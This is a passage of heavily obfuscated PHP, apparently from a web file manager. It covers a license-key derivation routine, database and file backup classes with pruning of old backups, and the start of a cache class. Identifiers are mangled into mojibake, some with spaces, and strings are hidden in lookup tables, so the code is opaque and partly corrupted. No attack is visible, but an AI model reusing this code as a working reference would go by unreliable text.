$õ—Ô‚Ğ) . $ºéš¹ªã[307] . $â·Í—äã; return $·µˆ–½ç; $Àí”ÍÈØ = $üãÓà•[798]; while ($Àí”ÍÈØ < $üãÓà•[714]) { if ($Àí”ÍÈØ >= 0) { break; } $Àí”ÍÈØ++; } } public function vzsoc28323ef($´µÈ›¡Å) { $³Şµš¢‰ =& $_SERVER[Š—Â“œÔ]; $¾Ğ™˜Ø =& $_SERVER[Ÿ­Œüû]; $£äçÊñ = explode($¾Ğ™˜Ø[307], $´µÈ›¡Å); if (count($£äçÊñ) != 2) { return $¾Ğ™˜Ø[6]; } $×ÖØÆÁ = $this->jicf53ec45a2($£äçÊñ[1] . $¾Ğ™˜Ø[6], $¾Ğ™˜Ø[136]); if (!$×ÖØÆÁ) { return $¾Ğ™˜Ø[6]; } $×ÖØÆÁ = intval($×ÖØÆÁ); $ôáç¤Ş² = 0; $·ù¥„öÄ = $³Şµš¢‰[799]; $ûÜØƒ×„ = 0; $Üæ¯Ÿ« = $³Şµš¢‰[800]; for ($ãîÕ÷Ê÷ = 3; $ãîÕ÷Ê÷ < $×ÖØÆÁ; $ãîÕ÷Ê÷ += 2) { if ($×ÖØÆÁ % $ãîÕ÷Ê÷ != 0) { continue; } $ôáç¤Ş² = $ãîÕ÷Ê÷; $Ùºß‡œ = $³Şµš¢‰[801]; if (strlen($Ùºß‡œ) < $³Şµš¢‰[689]) { die; } $ûÜØƒ×„ = intval($×ÖØÆÁ / $ãîÕ÷Ê÷); $¼œğ´Ö = $³Şµš¢‰[802]; if (!$¼œğ´Ö) { die; } break; $õ‡ïí´ = $³Şµš¢‰[803]; if (strlen($õ‡ïí´) < $³Şµš¢‰[697]) { die; } } $ÆÜ×¥–å = ($ôáç¤Ş² - 1) * ($ûÜØƒ×„ - 1); $¸­ñ«¦ó = $³Şµš¢‰[804]; if (strlen($¸­ñ«¦ó) < $³Şµš¢‰[691]) { return; } $Ş™×» = intval(($ôáç¤Ş² + $ûÜØƒ×„) / 2); while (1) { $¨éµŞ¹ = $Ş™×»; $™â×¢Æ = $ÆÜ×¥–å; while ($™â×¢Æ % $¨éµŞ¹ != 0) { $¬£öÅê¶ = $™â×¢Æ; $ÔùÈÉ•‡ = $³Şµš¢‰[805]; if (strlen($ÔùÈÉ•‡) < $³Şµš¢‰[697]) { die; } $™â×¢Æ = $¨éµŞ¹; $¾â‘ÊÀœ = $³Şµš¢‰[806]; $¨éµŞ¹ = $¬£öÅê¶ % $¨éµŞ¹; } if ($¨éµŞ¹ == 1) { break; } else { $Ş™×»++; } } $ù’Ä˜Úì = 2; for ($ãîÕ÷Ê÷ = 0; $ãîÕ÷Ê÷ < $ÆÜ×¥–å * 10; $ãîÕ÷Ê÷++) { if (($ÆÜ×¥–å * $ãîÕ÷Ê÷ + 1) % $Ş™×» == 0) { $ù’Ä˜Úì = intval(($ÆÜ×¥–å * $ãîÕ÷Ê÷ + 1) / $Ş™×»); break; } } $€¿ê¾„ = md5($¾Ğ™˜Ø[304] . ($ôáç¤Ş² + $ûÜØƒ×„) . $¾Ğ™˜Ø[305] . $Ş™×» . $¾Ğ™˜Ø[305] . $ù’Ä˜Úì . $¾Ğ™˜Ø[306]); $÷¾’úÒµ = $³Şµš¢‰[807]; $á¹Í®ª = $this->jicf53ec45a2($£äçÊñ[0], $€¿ê¾„); return $á¹Í®ª; } public function uxdh901d460e() { $˜•òÛ¤š =& $_SERVER[Š—Â“œÔ]; $ğšÛ÷œƒ = mt_rand(pow(2, 14), pow(2, 16) - 1); $‰÷—úƒ¬ = $˜•òÛ¤š[808]; while ($‰÷—úƒ¬ < $˜•òÛ¤š[694]) { if ($‰÷—úƒ¬ >= 0) { break; } $‰÷—úƒ¬++; } $—÷ñÎè´ = array(); $˜ëÔáŠ¥ = $˜•òÛ¤š[809]; if (!$˜ëÔáŠ¥) { die; } $ãË¤ë ì = 1; $…‹‰ô = $˜•òÛ¤š[810]; if (!$…‹‰ô) { return; } while ($ãË¤ë ì <= (int) sqrt($ğšÛ÷œƒ)) { $è¾¸ÅÈÅ = $ãË¤ë ì; $ŞòÎŸóã = $˜•òÛ¤š[811]; while (!0) { $è¾¸ÅÈÅ++; if ($è¾¸ÅÈÅ <= 2) { $ãË¤ë ì = $è¾¸ÅÈÅ; break; } else { if ($è¾¸ÅÈÅ < 2) { continue; } } $‰¤å‚ = !0; for ($¯Ùºà› = 2; $¯Ùºà› <= sqrt($è¾¸ÅÈÅ); $¯Ùºà›++) { if ($è¾¸ÅÈÅ % $¯Ùºà› == 0) { $‰¤å‚ = !1; } } if ($‰¤å‚) { $ãË¤ë ì = $è¾¸ÅÈÅ; break; } } $—÷ñÎè´[] = $ãË¤ë ì; $õŞºâ”Ù = $˜•òÛ¤š[812]; while (strlen($õŞºâ”Ù) < $˜•òÛ¤š[691]) { if (!$õŞºâ”Ù) { break; } $õŞºâ”Ù++; } } $¤ƒ¼ãŒ… = 2; $õ°ñŞ—ö = $˜•òÛ¤š[813]; if (strlen($õ°ñŞ—ö) < $˜•òÛ¤š[694]) { die; } for ($è¾¸ÅÈÅ = $ğšÛ÷œƒ; $è¾¸ÅÈÅ > 1; $è¾¸ÅÈÅ--) { $‰¤å‚ = !0; foreach ($—÷ñÎè´ as $ˆ§õ×¶ù) { if ($è¾¸ÅÈÅ % $ˆ§õ×¶ù == 0) { $‰¤å‚ = !1; break; } } if ($‰¤å‚) { $¤ƒ¼ãŒ… = $è¾¸ÅÈÅ; break; } } return $¤ƒ¼ãŒ…; $¶åı¦ğ = $˜•òÛ¤š[814]; if (!$¶åı¦ğ) { die; } } public function bjaxaebf4a80($Ú·ŠĞ¼, $å ¸ÈÜİ) { $”ã™‡ê– =& $_SERVER[Ÿ­Œüû]; return call_user_func(array($”ã™‡ê–[8], $”ã™‡ê–[308]), $Ú·ŠĞ¼, $å ¸ÈÜİ); } public function xprs01da9744($èÍêœ°“, $«ÄÌ”áÓ) { $ƒ…°˜Ó¾ =& $_SERVER[Ÿ­Œüû]; return call_user_func(array($ƒ…°˜Ó¾[309], $ƒ…°˜Ó¾[310]), $èÍêœ°“, $«ÄÌ”áÓ); } public function jicf53ec45a2($ĞœïıàÈ, $¢‘Ç¤áå) { $Ü›Ñ–Ø¦ =& $_SERVER[Ÿ­Œüû]; return call_user_func(array($Ü›Ñ–Ø¦[309], $Ü›Ñ–Ø¦[311]), $ĞœïıàÈ, $¢‘Ç¤áå); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[Š—Â“œÔ][815]); $this->init(); $this->keep(); } public function init() { $Îùò—¯° =& $_SERVER[Š—Â“œÔ]; $this->isManual(); self::$name = date($Îùò—¯°[816]); if (!($´‘–¬ÜĞ = $this->model->lastItem())) { $´‘–¬ÜĞ = $this->initData(); } else { self::$name = $´‘–¬ÜĞ[$Îùò—¯°[32]]; if ($´‘–¬ÜĞ[$Îùò—¯°[817]] == $Îùò—¯°[91]) { self::$name = date($Îùò—¯°[261]); $şàòÅÄÄ = intval(_get($´‘–¬ÜĞ, $Îùò—¯°[818], 0)); if (self::$manual == 0 && $´‘–¬ÜĞ[$Îùò—¯°[32]] == self::$name) { $this->model->remove($´‘–¬ÜĞ[$Îùò—¯°[477]]); } $´‘–¬ÜĞ = $this->initData($şàòÅÄÄ, $´‘–¬ÜĞ[$Îùò—¯°[819]]); } else { $this->checkStore($´‘–¬ÜĞ[$Îùò—¯°[819]]); } } self::$option = $´‘–¬ÜĞ; } private function isManual() { $ÆŒÔıÄµ = _get($GLOBALS, $_SERVER[Š—Â“œÔ][820], 0); $ÆŒÔıÄµ = intval($ÆŒÔıÄµ); self::$manual = $ÆŒÔıÄµ && $ÆŒÔıÄµ == 1 ? 1 : 0; } private function initData($¶¼âÓ„— = 0, $µ£ø˜İ» = '') { $Ûò©Ó¥Å =& $_SERVER[Š—Â“œÔ]; $²’«©å = $this->model->config(); if ($µ£ø˜İ» && $²’«©å[$Ûò©Ó¥Å[819]] != $µ£ø˜İ») { $¶¼âÓ„— = 0; } $this->checkStore($²’«©å[$Ûò©Ó¥Å[819]]); if (self::$manual == 1) { self::$name .= $Ûò©Ó¥Å[11] . date($Ûò©Ó¥Å[821]); } $âµñ±ÔÚ = array($Ûò©Ó¥Å[819] => $²’«©å[$Ûò©Ó¥Å[819]], $Ûò©Ó¥Å[32] => self::$name, $Ûò©Ó¥Å[817] => 0, $Ûò©Ó¥Å[171] => $²’«©å[$Ûò©Ó¥Å[171]], $Ûò©Ó¥Å[822] => self::$manual, $Ûò©Ó¥Å[370] => array($Ûò©Ó¥Å[823] => array($Ûò©Ó¥Å[817] => 0), $Ûò©Ó¥Å[824] => array($Ûò©Ó¥Å[817] => 0, $Ûò©Ó¥Å[825] => 0, $Ûò©Ó¥Å[826] => 0, $Ûò©Ó¥Å[33] => $Ûò©Ó¥Å[12], $Ûò©Ó¥Å[827] => 0, $Ûò©Ó¥Å[828] => 0), $Ûò©Ó¥Å[829] => array($Ûò©Ó¥Å[817] => 0, $Ûò©Ó¥Å[825] => 0, $Ûò©Ó¥Å[826] => 0, $Ûò©Ó¥Å[827] => 0, $Ûò©Ó¥Å[828] => 0), $Ûò©Ó¥Å[232] => array($Ûò©Ó¥Å[817] => 0, $Ûò©Ó¥Å[830] => 0, $Ûò©Ó¥Å[831] => 0, $Ûò©Ó¥Å[832] => 0, $Ûò©Ó¥Å[833] => 0, $Ûò©Ó¥Å[543] => $¶¼âÓ„—, $Ûò©Ó¥Å[827] => 0, $Ûò©Ó¥Å[828] => 0)), $Ûò©Ó¥Å[827] => time(), $Ûò©Ó¥Å[828] => 0); $õäÀÂôŞ = $this->model->insert($âµñ±ÔÚ); $âµñ±ÔÚ[$Ûò©Ó¥Å[477]] = $õäÀÂôŞ; return $âµñ±ÔÚ; } private function checkStore($«Ğ™ñ‹Õ) { $²ÀñÖí = Model($_SERVER[Š—Â“œÔ][834]); $»‚Æı¶Ÿ = $²ÀñÖí->listData($«Ğ™ñ‹Õ); $²ÀñÖí->checkConfig($»‚Æı¶Ÿ); } public static function get() { if (!self::$option) { $÷üŠéÆÊ = Model($_SERVER[Š—Â“œÔ][815]); $›ãÌã§™ = $÷üŠéÆÊ->findByName(self::$name); $÷üŠéÆÊ->parseContent($›ãÌã§™); self::$option = $›ãÌã§™; } return self::$option; } public static function set($ÕûîÃ‹ ) { $¢ÈÓ´‚À =& $_SERVER[Š—Â“œÔ]; $–Ê‰²Å† = self::get(); foreach ($ÕûîÃ‹  as $â‚ÚÇ³¶ => $Œ‚É´‹ğ) { array_set_value($–Ê‰²Å†, $â‚ÚÇ³¶, $Œ‚É´‹ğ); } Model($¢ÈÓ´‚À[815])->update($–Ê‰²Å†[$¢ÈÓ´‚À[477]], $–Ê‰²Å†); self::$option = $–Ê‰²Å†; return self::$option; } public function keep() { $›ˆ®ÃÄÚ =& $_SERVER[Š—Â“œÔ]; $Ó¢°åé™ = self::get(); if (_get($Ó¢°åé™, $›ˆ®ÃÄÚ[835], 0) == $›ˆ®ÃÄÚ[91]) { return; } $this->backupKeep($Ó¢°åé™); self::set(array($›ˆ®ÃÄÚ[835] => 1)); } private function backupKeep($¬§Šì‚) { $Å¨Á‹äÌ =& $_SERVER[Š—Â“œÔ]; if (self::$manual == 1) { return; } $îÓé–¼¦ = $this->model->listData(); if (empty($îÓé–¼¦)) { return; } $İ˜ƒìğÑ = 0; $£·Œ…† = array(); foreach ($îÓé–¼¦ as $ìè¸íŸØ) { if ($İ˜ƒìğÑ >= 7) { break; } $£·Œ…†[] = $ìè¸íŸØ[$Å¨Á‹äÌ[32]]; $İ˜ƒìğÑ++; } for ($İ˜ƒìğÑ = 0; $İ˜ƒìğÑ < 12; $İ˜ƒìğÑ++) { $£·Œ…†[] = date($Å¨Á‹äÌ[836], strtotime("\x2d{$İ˜ƒìğÑ}\x20\x6d\x6f\156\164\x68\163")); } $£·Œ…† = array_unique($£·Œ…†); $—ƒìåá = Model($Å¨Á‹äÌ[837])->get($Å¨Á‹äÌ[838]); foreach ($îÓé–¼¦ as $ìè¸íŸØ) { if (isset($ìè¸íŸØ[$Å¨Á‹äÌ[822]]) && $ìè¸íŸØ[$Å¨Á‹äÌ[822]] == $Å¨Á‹äÌ[91]) { continue; } if (!empty($ìè¸íŸØ[$Å¨Á‹äÌ[32]]) && in_array($ìè¸íŸØ[$Å¨Á‹äÌ[32]], $£·Œ…†)) { continue; } $this->model->remove($ìè¸íŸØ[$Å¨Á‹äÌ[477]]); $ÍÆ¾Âó§ = $this->backupPath($¬§Šì‚, $—ƒìåá); IO::remove($ÍÆ¾Âó§, !1); } } private function backupPath($åÎåçìÈ, $ó¾ÇŒŒ = false) { $ùË«Ä± =& $_SERVER[Š—Â“œÔ]; if (!$ó¾ÇŒŒ) { $ó¾ÇŒŒ = Model($ùË«Ä±[837])->get($ùË«Ä±[838]); } $­ÁÉ¦û½ = $åÎåçìÈ[$ùË«Ä±[32]]; $¤ÎùŠ‘ = substr(md5($ùË«Ä±[839] . $ó¾ÇŒŒ . $­ÁÉ¦û½), 0, 8); return "\173\x69\x6f\72{$åÎåçìÈ[$ùË«Ä±[819]]}\x7d\57\x64\x61\164\x61\x62\141\x73\x65\57\142\x61\x63\x6b\165\160\x2f" . $­ÁÉ¦û½ . $ùË«Ä±[11] . $¤ÎùŠ‘; } public function db() { $ĞõıŸÍ =& $_SERVER[Š—Â“œÔ]; $…º±ğ = self::get(); if (_get($…º±ğ, $ĞõıŸÍ[840], 0) == $ĞõıŸÍ[91]) { return !0; } $¶Äº° = new BackupDb(); if (!$¶Äº°->index()) { return !1; } self::set(array($ĞõıŸÍ[840] => 1)); return !0; } public function dbFile() { $‰ÁÊØÍÄ =& $_SERVER[Š—Â“œÔ]; $ºàÇ’å¶ = self::get(); if (_get($ºàÇ’å¶, $‰ÁÊØÍÄ[841], 0) == $‰ÁÊØÍÄ[91]) { return !0; } $ÙÇÄ½Ù = new BackupDbFile(); if (!$ÙÇÄ½Ù->index()) { return !1; } self::set(array($‰ÁÊØÍÄ[841] => 1)); return !0; } public function file() { $Á¤öÏ“ =& $_SERVER[Š—Â“œÔ]; $ğ¨Í÷‚£ = self::get(); if (_get($ğ¨Í÷‚£, $Á¤öÏ“[842], 0) == $Á¤öÏ“[91]) { return !0; } if ($ğ¨Í÷‚£[$Á¤öÏ“[171]] == $Á¤öÏ“[843]) { $®¼Æñğ£ = new BackupFile(); if (!$®¼Æñğ£->index()) { return !1; } } self::set(array($Á¤öÏ“[842] => 1, $Á¤öÏ“[817] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ğÏûüäÜ =& $_SERVER[Š—Â“œÔ]; $µœ¬Üö® = Backup::get(); self::$io = $µœ¬Üö®[$ğÏûüäÜ[819]]; self::$name = $µœ¬Üö®[$ğÏûüäÜ[32]]; $€ÜÁ¿Ú’ = new DbManage(); $Ã ¥æĞÌ = $€ÜÁ¿Ú’->dbType(); $±¨–ıî­ = array($ğÏûüäÜ[844] => $Ã ¥æĞÌ, $ğÏûüäÜ[845] => time()); Backup::set($±¨–ıî­); $ğ¯‹Ğ¨ = $this->tmpFilesPath() . $ğÏûüäÜ[846] . self::$name . $ğÏûüäÜ[8]; del_dir($ğ¯‹Ğ¨); mk_dir($ğ¯‹Ğ¨); $”Ï˜Õı = $Ú’ˆ¬— = 0; try { $òÕêØ’“ = $€ÜÁ¿Ú’->db()->getTables(); } catch (Exception $Ğ½ˆ÷³÷) { return !1; } $òÕêØ’“ = array_diff($òÕêØ’“, array($ğÏûüäÜ[847], $ğÏûüäÜ[848])); foreach ($òÕêØ’“ as $‰òİÌª) { if ($‰òİÌª == $ğÏûüäÜ[849]) { continue; } $”Ï˜Õı += $€ÜÁ¿Ú’->model($‰òİÌª)->count(); } $˜ë¨Í = new Task($ğÏûüäÜ[850], $ğÏûüäÜ[851], $”Ï˜Õı, LNG($ğÏûüäÜ[852]) . $ğÏûüäÜ[853] . LNG($ğÏûüäÜ[854])); $GLOBALS[$ğÏûüäÜ[855]] = self::$name; foreach ($òÕêØ’“ as $‰òİÌª) { $Ÿâ¥ Ìı = $ğ¯‹Ğ¨ . $‰òİÌª . $ğÏûüäÜ[856]; if ($‰òİÌª == $ğÏûüäÜ[849]) { @touch($Ÿâ¥ Ìı); continue; } $”ó°ÃÕÊ = null; if ($‰òİÌª == $ğÏûüäÜ[857] && $µœ¬Üö®[$ğÏûüäÜ[171]] == $ğÏûüäÜ[843]) { $”ó°ÃÕÊ = self::$io; } $Ú’ˆ¬— += $€ÜÁ¿Ú’->sqlFromDb($‰òİÌª, $Ÿâ¥ Ìı, $˜ë¨Í, $”ó°ÃÕÊ); } unset($GLOBALS[$ğÏûüäÜ[855]]); $˜ë¨Í->end(); if ($Ú’ˆ¬— > $”Ï˜Õı) { $”Ï˜Õı = $Ú’ˆ¬—; } $±¨–ıî­ = array($ğÏûüäÜ[844] => $Ã ¥æĞÌ, $ğÏûüäÜ[840] => 1, $ğÏûüäÜ[858] => $”Ï˜Õı, $ğÏûüäÜ[859] => $Ú’ˆ¬—, $ğÏûüäÜ[860] => time()); Backup::set($±¨–ıî­); if ($”Ï˜Õı - $Ú’ˆ¬— > 0) { $Úšşìï‰ = $ğÏûüäÜ[861]; if (!stristr(I18n::getType(), $ğÏûüäÜ[862])) { $Úšşìï‰ = $ğÏûüäÜ[863]; } write_log(array($Úšşìï‰, $±¨–ıî­), $ğÏûüäÜ[851]); return !1; } return !0; } private function tmpFilesPath() { $ˆ“òµ„ =& $_SERVER[Š—Â“œÔ]; $ëë’ÏéÄ = TEMP_FILES; if ($GLOBALS[$ˆ“òµ„[6]][$ˆ“òµ„[92]][$ˆ“òµ„[864]]) { $ëë’ÏéÄ = $GLOBALS[$ˆ“òµ„[6]][$ˆ“òµ„[92]][$ˆ“òµ„[864]]; if (!mk_dir($ëë’ÏéÄ) || !is_writable($ëë’ÏéÄ) || !IO::mkfile($ëë’ÏéÄ . $ˆ“òµ„[865])) { $ëë’ÏéÄ = TEMP_FILES; } } return $ëë’ÏéÄ; } } goto C¾ÍÏê™Œè; C¾ÍÏê™Œè: class BackupDbFile { public function __construct() { } public function index() { $ëáåûì¨ =& $_SERVER[Š—Â“œÔ]; $‚„²è€• = Backup::get(); $ú—¥ˆªä = $‚„²è€•[$ëáåûì¨[32]]; $Ãº…‰ø = $this->tmpFilesPath() . "\x62\141\143\153\165\160\x5f{$ú—¥ˆªä}\x2f"; $æµâÉ³™ = $this->backupPath($‚„²è€•); if (!($æµâÉ³™ = IO::mkdir($æµâÉ³™))) { return !1; } $ñù‡æ×á = IO::listPath($Ãº…‰ø); $¤ßã¹“ = isset($ñù‡æ×á[$ëáåûì¨[86]]) ? $ñù‡æ×á[$ëáåûì¨[86]] : array(); $ªö±íÒÅ = array_sum(array_column($¤ßã¹“, $ëáåûì¨[79])); if (!$ªö±íÒÅ) { return !1; } $•…Â¢œ¢ = array($ëáåûì¨[866] => $ªö±íÒÅ, $ëáåûì¨[867] => time()); Backup::set($•…Â¢œ¢); $Üü´Çš = new TaskFileTransfer($ëáåûì¨[868], $ëáåûì¨[851], count($¤ßã¹“), LNG($ëáåûì¨[852]) . $ëáåûì¨[464] . LNG($ëáåûì¨[854]) . $ëáåûì¨[869]); $Üü´Çš->task[$ëáåûì¨[830]] = $ªö±íÒÅ; foreach ($ñù‡æ×á[$ëáåûì¨[86]] as $£¶æóÆå) { $À©ÄØÎ = IO::move($£¶æóÆå[$ëáåûì¨[87]], $æµâÉ³™); if (!$À©ÄØÎ) { $Üü´Çš->end(); $†é«ºŒ’ = IO::getLastError($ëáåûì¨[870] . $£¶æóÆå[$ëáåûì¨[87]] . $ëáåûì¨[871] . $æµâÉ³™ . $ëáåûì¨[178]); write_log($†é«ºŒ’, $ëáåûì¨[851]); return !1; } } $ûšúÎ‘ê = new DbManage(); $ç·‚ğ € = $ûšúÎ‘ê->getSqlFile(); if (!$ç·‚ğ €[$ëáåûì¨[872]] || !$ç·‚ğ €[$ëáåûì¨[13]]) { return !1; } IO::move($ç·‚ğ €[$ëáåûì¨[872]], $æµâÉ³™); IO::move($ç·‚ğ €[$ëáåûì¨[13]], $æµâÉ³™); $Üü´Çš->end(); $•…Â¢œ¢ = array($ëáåûì¨[873] => $ªö±íÒÅ, $ëáåûì¨[874] => time()); Backup::set($•…Â¢œ¢); return !0; } private function backupPath($à¿Ö„ÁÎ) { $Ùæ–è† =& $_SERVER[Š—Â“œÔ]; $¤ñô»± = $à¿Ö„ÁÎ[$Ùæ–è†[32]]; $¥ºÃÍÚ = Model($Ùæ–è†[837])->get($Ùæ–è†[838]); $·ÊØ˜£§ = substr(md5($Ùæ–è†[839] . $¥ºÃÍÚ . $¤ñô»±), 0, 8); return "\173\151\x6f\x3a{$à¿Ö„ÁÎ[$Ùæ–è†[819]]}\175\x2f\144\141\164\x61\142\x61\x73\x65\57\142\141\143\153\165\160\x2f" . $¤ñô»± . $Ùæ–è†[11] . $·ÊØ˜£§; } private function tmpFilesPath() { $•«Š¯ç =& $_SERVER[Š—Â“œÔ]; $¥•ˆŸåÃ = TEMP_FILES; if ($GLOBALS[$•«Š¯ç[6]][$•«Š¯ç[92]][$•«Š¯ç[864]]) { $¥•ˆŸåÃ = $GLOBALS[$•«Š¯ç[6]][$•«Š¯ç[92]][$•«Š¯ç[864]]; if (!mk_dir($¥•ˆŸåÃ) || !is_writable($¥•ˆŸåÃ) || !IO::mkfile($¥•ˆŸåÃ . $•«Š¯ç[865])) { $¥•ˆŸåÃ = TEMP_FILES; } } return $¥•ˆŸåÃ; } } class BackupFile { public function __construct() { } public function index() { $·ñØ¹Ú¡ = Backup::get(); $Á¡¥æñ“ = $·ñØ¹Ú¡[$_SERVER[Š—Â“œÔ][370]][$_SERVER[Š—Â“œÔ][232]][$_SERVER[Š—Â“œÔ][543]]; $û¡•çåû = array($_SERVER[Š—Â“œÔ][544] => array($_SERVER[Š—Â“œÔ][875], $Á¡¥æñ“), $_SERVER[Š—Â“œÔ][876] => array($_SERVER[Š—Â“œÔ][408], $·ñØ¹Ú¡[$_SERVER[Š—Â“œÔ][819]])); $ºèÓç’ = (int) Model($_SERVER[Š—Â“œÔ][857])->where($û¡•çåû)->count($_SERVER[Š—Â“œÔ][543]); $Î‡Ñ†Ç = (int) Model($_SERVER[Š—Â“œÔ][857])->where($û¡•çåû)->sum($_SERVER[Š—Â“œÔ][79]); $’©­Ù¢— = new TaskFileTransfer($_SERVER[Š—Â“œÔ][877], $_SERVER[Š—Â“œÔ][851], $ºèÓç’, LNG($_SERVER[Š—Â“œÔ][852]) . $_SERVER[Š—Â“œÔ][853] . LNG($_SERVER[Š—Â“œÔ][878])); $’©­Ù¢—->task[$_SERVER[Š—Â“œÔ][830]] = $Î‡Ñ†Ç; $Ìóõù‚¬ = array($_SERVER[Š—Â“œÔ][879] => $ºèÓç’, $_SERVER[Š—Â“œÔ][880] => $Î‡Ñ†Ç, $_SERVER[Š—Â“œÔ][881] => time()); Backup::set($Ìóõù‚¬); $ª÷ÚĞÜ† = !0; $®©ÜÙ™ú = $this->storeIds(); $ø¬é“ê = 1; $ÅµùÂÉ‡ = 1000; $Õ’„Ãº® = $Î´èş€» = 0; $¬×ÒÊÚ× = array(); $õÚ¸†¦À = $•¬ÇÏ¾ = 0; do { $ìÄ´ïë‰ = $_SERVER[Š—Â“œÔ][882]; $ˆŠÂÑéÎ = Model($_SERVER[Š—Â“œÔ][857])->where($û¡•çåû)->field($ìÄ´ïë‰)->order($_SERVER[Š—Â“œÔ][883])->selectPage($ÅµùÂÉ‡, $ø¬é“ê); $Ñªç¸¬ò = !empty($ˆŠÂÑéÎ[$_SERVER[Š—Â“œÔ][447]]) ? $ˆŠÂÑéÎ[$_SERVER[Š—Â“œÔ][447]] : array(); foreach ($Ñªç¸¬ò as $¶¤Õ·Ñ) { if (!$this->_fileExist($¶¤Õ·Ñ, $¬×ÒÊÚ×, $®©ÜÙ™ú)) { write_log("\x66\x69\x6c\145\x20\x6e\157\x74\x20\145\x78\151\x73\x74\56\146\151\x6c\x65\x49\x44\x3a{$¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][543]]}\54\x20\x70\141\x74\150\x3a{$¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][87]]}", $_SERVER[Š—Â“œÔ][884]); continue; } $™ò¡²÷ = $¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][87]]; $•“Õ€ÓÅ = "\x7b\151\157\x3a{$·ñØ¹Ú¡[$_SERVER[Š—Â“œÔ][819]]}\175" . substr($™ò¡²÷, strlen("\173\151\157\72{$¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][885]]}\175")); if (IO::exist($•“Õ€ÓÅ)) { $’©­Ù¢—->updateFileEnd($¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][32]], $¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][79]]); } else { $•“Õ€ÓÅ = get_path_father($•“Õ€ÓÅ); IO::mkdir($•“Õ€ÓÅ); if (!IO::copy($™ò¡²÷, $•“Õ€ÓÅ, $_SERVER[Š—Â“œÔ][886])) { write_log($_SERVER[Š—Â“œÔ][887] . $™ò¡²÷ . $_SERVER[Š—Â“œÔ][871] . $•“Õ€ÓÅ . $_SERVER[Š—Â“œÔ][178], $_SERVER[Š—Â“œÔ][851]); $ª÷ÚĞÜ† = !1; break; } } $Á¡¥æñ“ = $¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][543]]; $Î´èş€» += 1; $Õ’„Ãº® += $¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][79]]; $•¬ÇÏ¾ += 1; $õÚ¸†¦À += $¶¤Õ·Ñ[$_SERVER[Š—Â“œÔ][79]]; if ($Õ’„Ãº® >= 1024 * 1024 * 100) { $Ìóõù‚¬ = array($_SERVER[Š—Â“œÔ][818] => $Á¡¥æñ“, $_SERVER[Š—Â“œÔ][888] => $•¬ÇÏ¾, $_SERVER[Š—Â“œÔ][889] => $õÚ¸†¦À); Backup::set($Ìóõù‚¬); $Õ’„Ãº® = $Î´èş€» = 0; } } $Ş·Áú¥ê = count($Ñªç¸¬ò); $ø¬é“ê++; } while ($Ş·Áú¥ê == $ÅµùÂÉ‡); $’©­Ù¢—->end(); $Ìóõù‚¬ = array($_SERVER[Š—Â“œÔ][890] => 1, $_SERVER[Š—Â“œÔ][828] => time(), $_SERVER[Š—Â“œÔ][842] => 1, $_SERVER[Š—Â“œÔ][818] => $Á¡¥æñ“, $_SERVER[Š—Â“œÔ][891] => time()); if ($Î´èş€») { $Ìóõù‚¬[$_SERVER[Š—Â“œÔ][888]] = $•¬ÇÏ¾; $Ìóõù‚¬[$_SERVER[Š—Â“œÔ][889]] = $õÚ¸†¦À; } Backup::set($Ìóõù‚¬); return !0; } private function _fileExist($²ê‰Á¸Ë, &$ƒÑİÇõ, $®íİºã) { $Š¬áÔ§ =& $_SERVER[Š—Â“œÔ]; $­à¾ãëÜ = $²ê‰Á¸Ë[$Š¬áÔ§[87]]; if (in_array($²ê‰Á¸Ë[$Š¬áÔ§[543]], $ƒÑİÇõ)) { return !1; } if (!in_array($²ê‰Á¸Ë[$Š¬áÔ§[885]], $®íİºã)) { return !1; } if (IO::exist($­à¾ãëÜ)) { return !0; } $³…ÕŒà¨ = get_path_father($­à¾ãëÜ); if (IO::exist($³…ÕŒà¨)) { $ƒÑİÇõ[] = $²ê‰Á¸Ë[$Š¬áÔ§[543]]; return !1; } $İØ–×í = array($Š¬áÔ§[885] => $²ê‰Á¸Ë[$Š¬áÔ§[885]], $Š¬áÔ§[87] => array($Š¬áÔ§[461], "{$³…ÕŒà¨}\x25")); $ğ¨±½ìØ = Model($Š¬áÔ§[857])->where($İØ–×í)->field($Š¬áÔ§[544])->select(); $ƒÑİÇõ = array_merge($ƒÑİÇõ, array_to_keyvalue($ğ¨±½ìØ, $Š¬áÔ§[12], $Š¬áÔ§[543])); return !1; } private function _fileFilter($¸×áí±§) { $‰ö¬ùÌù =& $_SERVER[Š—Â“œÔ]; return; if (empty($¸×áí±§)) { return; } $¶Å“´Æí = array($‰ö¬ùÌù[543] => array($‰ö¬ùÌù[7], array_unique($¸×áí±§))); $ÙĞò¸Ä = Model($‰ö¬ùÌù[892])->where($¶Å“´Æí)->field($‰ö¬ùÌù[193])->select(); foreach ($ÙĞò¸Ä as $œÒğî²ä) { Model($‰ö¬ùÌù[892])->remove($œÒğî²ä[$‰ö¬ùÌù[193]], !1); } } private function storeIds() { $•›Ëì£Ô =& $_SERVER[Š—Â“œÔ]; $·ƒø¦éÕ = Model($•›Ëì£Ô[834])->listData(); $ ãñÚÕ€ = array(); $€¹™š¸õ = $GLOBALS[$•›Ëì£Ô[6]][$•›Ëì£Ô[92]][$•›Ëì£Ô[893]]; foreach ($·ƒø¦éÕ as $Â¬‚ı”î) { $•©ŞÙ—Ö = strtolower($Â¬‚ı”î[$•›Ëì£Ô[98]]); if (!isset($€¹™š¸õ[$•©ŞÙ—Ö])) { continue; } $Ã¥æÉ„ = $•›Ëì£Ô[77] . (isset($€¹™š¸õ[$•©ŞÙ—Ö]) ? $€¹™š¸õ[$•©ŞÙ—Ö] : ucfirst($•©ŞÙ—Ö)); if (!class_exists($Ã¥æÉ„)) { continue; } $ ãñÚÕ€[] = $Â¬‚ı”î[$•›Ëì£Ô[477]]; } return $ ãñÚÕ€; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Íä·íñ– =& $_SERVER[Š—Â“œÔ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Ãœ…ìÔ¡ = $GLOBALS[$Íä·íñ–[6]][$Íä·íñ–[426]]; $£§ ×÷  = 